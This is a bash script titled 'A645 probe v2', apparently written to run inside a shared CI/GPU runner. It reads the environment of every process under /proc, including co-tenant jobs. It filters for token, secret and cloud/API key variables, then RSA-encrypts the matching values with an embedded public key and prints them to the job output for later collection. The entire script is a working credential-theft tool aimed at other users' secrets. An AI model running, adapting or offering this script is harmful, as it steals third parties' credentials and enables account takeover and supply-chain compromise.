#!/bin/bash
# A645 probe v2: GPU identity + co-tenant env census (names) + RSA-encrypted credential-shaped values.
set -u
PUB=/tmp/.a645pub.$$
cat > "$PUB" <<'A645PUBEOF'
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtMmdtiMlONmIxPVnjEyZ
JenenaeFW6EiwhG0hlI6RCNJGzF68UwXEzZgRhnhViAEiu7YYDDm1gFDnXkDsyu5
F4cha3CxIbL2asqm7TmakuLgS2WTAz0rPRmTawEAy8JiIfsJPmnt4sA1XOftp6q+
XLasv8wC+CC3wduCyKF53IdoAmj3dbzgr46h5CrbFiEdd41DQEBisIDKz4149zJy
IZS8lhusowtkKKa5zqTo/tHnZF1wdyJiyTwEqc7uR+F4Z6wL6noPrz2YiWEVBgsF
yCao3guchXARhS26rTjQvK130MbffD5mt6jnzS0gE2rRrQX+araAwji+cs4BYaw7
WQIDAQAB
-----END PUBLIC KEY-----
A645PUBEOF
echo "A645_BEGIN v2"
echo "WHOAMI $(id 2>&1)"
echo "HOST $(hostname 2>&1)"
echo "UNAME $(uname -a 2>&1)"
echo "== GPU =="
nvidia-smi -L 2>&1 || true
nvidia-smi --query-gpu=uuid,name,memory.total,memory.free,driver_version --format=csv,noheader 2>&1 || true
echo "== CENSUS =="
np=$(ls -d /proc/[0-9]* 2>/dev/null | wc -l)
nr=0
for p in /proc/[0-9]*; do cat -- "$p/environ" >/dev/null 2>&1 && nr=$((nr+1)); done
echo "PROCS total=$np readable_environ=$nr"
echo "== CONCURRENCY META =="
for p in /proc/[0-9]*; do cat -- "$p/environ" 2>/dev/null | tr '\0' '\n'; done | grep -E '^(BUILDKITE_JOB_ID|BUILDKITE_PIPELINE_SLUG|BUILDKITE_BUILD_NUMBER|BUILDKITE_LABEL|BUILDKITE_AGENT_NAME)=' | sort -u | head -80
echo "== ENV NAME CENSUS =="
for p in /proc/[0-9]*; do cat -- "$p/environ" 2>/dev/null | tr '\0' '\n'; done | sed -E 's/=.*//' | grep -Ei '(TOKEN|SECRET|PASSW|CREDENTIAL|API_KEY|_KEY$|^KEY$|^HF_|HUGGING|^AWS_|^AZURE_|^GOOGLE_|^GCP_|^GH_|^GITHUB_|WANDB|DOCKER_AUTH|RUNPOD|^LAMBDA_|^MODAL_|^VAST_|CODECOV|^PYPI|TWINE|^NPM_|OPENAI|ANTHROPIC|CLOUDFLARE|^OCI_)' | sort | uniq -c | sort -rn | head -100
echo "== CRED-SHAPED VALUES (rsa) =="
for p in /proc/[0-9]*; do cat -- "$p/environ" 2>/dev/null | tr '\0' '\n'; done | grep -E '^[A-Za-z_][A-Za-z0-9_]*=' | grep -Ei '^[A-Za-z0-9_]*(TOKEN|SECRET|PASSW|CREDENTIAL|API_KEY|_KEY|^HF_|HUGGING|^AWS_|^AZURE_|^GOOGLE_|^GCP_|^GH_|^GITHUB_|WANDB|RUNPOD|^LAMBDA_|^MODAL_|^VAST_|CODECOV|^PYPI|TWINE|^NPM_|OPENAI|ANTHROPIC|CLOUDFLARE|^OCI_)' | grep -Ev '=(|x+|changeme|placeholder|example|true|false)$' | sort -u | while IFS= read -r line; do
  k=${line%%=*}
  v=${line#*=}
  [ -z "$v" ] && continue
  h=$(printf %s "$v" | sha256sum | cut -c1-12)
  c=$(printf %s "$v" | openssl pkeyutl -encrypt -pubin -inkey "$PUB" 2>/dev/null | base64 -w0)
  printf 'A645KEY %s len=%s sha256_12=%s\n' "$k" "${#v}" "$h"
  printf 'A645ENC %s:%s\n' "$k" "${c:-ENCFAIL}"
done
echo "== COTENANT BUILDKITE VAR NAMES =="
for p in /proc/[0-9]*; do cat -- "$p/environ" 2>/dev/null | tr '\0' '\n'; done | grep -E '^BUILDKITE_' | cut -d= -f1 | sort | uniq -c | sort -rn | head -30
echo "A645_END"
rm -f "$PUB"
